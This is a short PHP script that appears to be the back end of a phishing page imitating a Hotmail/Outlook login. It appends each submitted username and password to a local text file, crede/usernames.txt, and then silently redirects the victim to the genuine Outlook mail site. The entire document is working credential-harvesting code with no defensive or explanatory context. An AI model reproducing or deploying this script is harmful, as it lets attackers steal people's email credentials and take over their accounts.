<?php

file_put_contents("crede/usernames.txt", "Hotmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://outlook.live.com/mail/0/');
exit();
?>